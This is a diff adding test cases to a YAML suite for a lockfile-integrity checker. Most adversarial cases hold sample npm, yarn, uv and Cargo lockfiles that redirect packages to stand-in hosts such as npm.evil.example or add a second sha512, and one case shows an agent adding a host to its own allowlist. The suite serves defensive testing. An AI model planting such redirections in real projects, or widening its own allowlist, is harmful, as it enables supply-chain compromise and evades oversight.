@@ -669,3 +669,181 @@ suite:
       writes:
         package-lock.json: "{\n  \"name\": \"app\",\n  \"version\": \"1.0.0\",\n  \"lockfileVersion\": 3,\n  \"requires\": true,\n  \"packages\": {\n    \"\": {\n      \"name\": \"app\",\n      \"version\": \"1.0.0\",\n      \"dependencies\": {\n        \"old\": \"^1.0.0\"\n      }\n    },\n    \"node_modules/old\": {\n      \"version\": \"1.0.0\",\n      \"resolved\": \"git+ssh://git@github.com/x/old.git#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n    }\n  }\n}\n\n"
       expect: allow
+  - id: tc-046
+    category: adversarial
+    prompt: A lock marks a top-level package inBundle while resolving it from another host.
+    expect: 'Blocked: npm still fetches a bundle the root lists; only one inside a dependency''s tarball is skipped.'
+    execute:
+      event: commit
+      head_files: *id001
+      files:
+        package.json: "{\n  \"name\": \"app\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"left-pad\": \"^1.3.0\",\n    \"is-odd\": \"^3.0.1\"\n  }\n}\n"
+        package-lock.json: "{\n  \"name\": \"app\",\n  \"version\": \"1.0.0\",\n  \"lockfileVersion\": 3,\n  \"requires\": true,\n  \"packages\": {\n    \"\": {\n      \"name\": \"app\",\n      \"version\": \"1.0.0\",\n      \"dependencies\": {\n        \"left-pad\": \"^1.0.0\",\n        \"is-odd\": \"^1.0.0\"\n      }\n    },\n    \"node_modules/left-pad\": {\n      \"version\": \"1.3.0\",\n      \"resolved\": \"https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz\",\n      \"integrity\": \"sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\"\n    },\n    \"node_modules/is-odd\": {\n      \"version\": \"3.0.1\",\n      \"resolved\": \"https://npm.evil.example/is-odd.tgz\",\n      \"integrity\": \"sha512-FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF==\",\n      \"inBundle\": true\n    }\n  }\n}\n"
+      expect: block
+  - id: tc-047
+    category: adversarial
+    prompt: A classic yarn.lock writes its resolved field with a colon, as the yarn parser also accepts.
+    expect: 'Blocked: the field is read either way, and its host is not the registry.'
+    execute:
+      event: commit
+      files:
+        package.json: "{\n  \"name\": \"app\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"is-odd\": \"^3.0.1\"\n  }\n}\n"
+        yarn.lock: "is-odd@^3.0.1:\n  version \"3.0.1\"\n  resolved: \"https://npm.evil.example/is-odd-3.0.1.tgz\"\n  integrity sha512-EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE==\n"
+      expect: block
+  - id: tc-048
+    category: adversarial
+    prompt: A uv.lock source names the registry and a local editable path at once, with an sdist on another host.
+    expect: 'Blocked: a source that is both local and remote is refused as unreadable.'
+    execute:
+      event: commit
+      files:
+        pyproject.toml: '[project]
+
+          name = "app"
+
+          dependencies = ["certifi"]
+
+          '
+        uv.lock: 'version = 1
+
+
+          [[package]]
+
+          name = "certifi"
+
+          version = "2024.12.14"
+
+          source = { registry = "https://pypi.org/simple", editable = "." }
+
+          sdist = { url = "https://evil.example/certifi.tar.gz", hash = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" }
+
+          '
+      expect: block
+  - id: tc-049
+    category: adversarial
+    prompt: A Berry yarn.lock patches a package fetched from a URL on another host.
+    expect: 'Blocked: a patch: is judged by the reference it wraps.'
+    execute:
+      event: commit
+      files:
+        package.json: "{\n  \"name\": \"app\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"is-odd\": \"^3.0.1\"\n  }\n}\n"
+        yarn.lock: "__metadata:\n  version: 8\n  cacheKey: 10c0\n\n\"is-odd@patch:is-odd@npm%3A3.0.1#./p.patch\":\n  version: 3.0.1\n  resolution: \"is-odd@patch:is-odd@https%3A%2F%2Fnpm.evil.example%2Fis-odd.tgz#./p.patch::version=3.0.1&hash=abc\"\n  checksum: 10c0/dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\n"
+      expect: block
+  - id: tc-050
+    category: adversarial
+    prompt: A Cargo.lock swaps a crates.io crate for a pinned git source on another host.
+    expect: 'Blocked: no git host is a default; a person allowlists a reviewed one.'
+    execute:
+      event: commit
+      files:
+        Cargo.toml: '[package]
+
+          name = "app"
+
+          version = "0.1.0"
+
+
+          [dependencies]
+
+          serde = { git = "https://evil.example/serde" }
+
+          '
+        Cargo.lock: '[[package]]
+
+          name = "serde"
+
+          version = "1.0.0"
+
+          source = "git+https://evil.example/serde?rev=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+
+          '
+      expect: block
+  - id: tc-051
+    category: adversarial
+    prompt: As the agent writes, it adds a host to .chock/registry-allowlist.txt.
+    expect: 'Refused: an agent may not widen the allowlist that judges its own locks.'
+    execute:
+      event: tool_use
+      head_files: *id001
+      writes:
+        .chock/registry-allowlist.txt: 'npm.evil.example
+
+          '
+      expect: block
+  - id: tc-052
+    category: adversarial
+    prompt: A lock keeps left-pad@1.3.0 but points it at another package's tarball on the registry and adds a second sha512.
+    expect: 'Blocked: a registry URL must name its own package, and npm accepts any listed sha512, so an added one is a replacement.'
+    execute:
+      event: commit
+      head_files: *id001
+      files:
+        package.json: "{\n  \"name\": \"app\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"left-pad\": \"^1.3.0\",\n    \"is-odd\": \"^3.0.1\"\n  }\n}\n"
+        package-lock.json: "{\n  \"name\": \"app\",\n  \"version\": \"1.0.0\",\n  \"lockfileVersion\": 3,\n  \"requires\": true,\n  \"packages\": {\n    \"\": {\n      \"name\": \"app\",\n      \"version\": \"1.0.0\",\n      \"dependencies\": {\n        \"left-pad\": \"^1.0.0\"\n      }\n    },\n    \"node_modules/left-pad\": {\n      \"version\": \"1.3.0\",\n      \"resolved\": \"https://registry.npmjs.org/evil-pad/-/evil-pad-6.6.6.tgz\",\n      \"integrity\": \"sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA== sha512-QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ==\"\n    }\n  }\n}\n"
+      expect: block
+  - id: tc-053
+    category: negative_trigger
+    prompt: A yarn upgrade rewrites yarn.lock with a new cache key, recomputing every checksum.
+    expect: 'Allowed: checksums under different cache keys are not compared.'
+    execute:
+      event: commit
+      head_files:
+        package.json: "{\n  \"name\": \"app\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"left-pad\": \"^1.3.0\"\n  }\n}\n"
+        yarn.lock: "__metadata:\n  version: 8\n  cacheKey: 8\n\n\"left-pad@npm:^1.3.0\":\n  version: 1.3.0\n  resolution: \"left-pad@npm:1.3.0\"\n  checksum: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n  languageName: node\n  linkType: hard\n"
+      files:
+        package.json: "{\n  \"name\": \"app\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"left-pad\": \"^1.3.0\",\n    \"x\": \"1\"\n  }\n}\n"
+        yarn.lock: "__metadata:\n  version: 8\n  cacheKey: 10c0\n\n\"left-pad@npm:^1.3.0\":\n  version: 1.3.0\n  resolution: \"left-pad@npm:1.3.0\"\n  checksum: 10c0/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n  languageName: node\n  linkType: hard\n"
+      expect: allow
+  - id: tc-054
+    category: negative_trigger
+    prompt: A commit bumps a Go module; go mod tidy replaces the old version's go.sum lines.
+    expect: 'Allowed: a module still present at a new version was not dropped.'
+    execute:
+      event: commit
+      head_files:
+        go.mod: 'module app
+
+
+          go 1.22
+
+
+          require golang.org/x/text v0.14.0
+
+          '
+        go.sum: 'golang.org/x/text v0.14.0 h1:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
+
+          golang.org/x/text v0.14.0/go.mod h1:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=
+
+          '
+      files:
+        go.mod: 'module app
+
+
+          go 1.22
+
+
+          require golang.org/x/text v0.15.0
+
+          '
+        go.sum: 'golang.org/x/text v0.15.0 h1:DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD=
+
+          golang.org/x/text v0.15.0/go.mod h1:EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE=
+
+          '
+      expect: allow
+  - id: tc-055
+    category: negative_trigger
+    prompt: An npm project adds the other package managers' lock names to .gitignore.
+    expect: 'Allowed: ignoring a lock the folder does not hold keeps the project to one package manager.'
+    execute:
+      event: commit
+      head_files: *id001
+      files:
+        .gitignore: 'node_modules/
+
+          yarn.lock
+
+          pnpm-lock.yaml
+
+          '
+      expect: allow
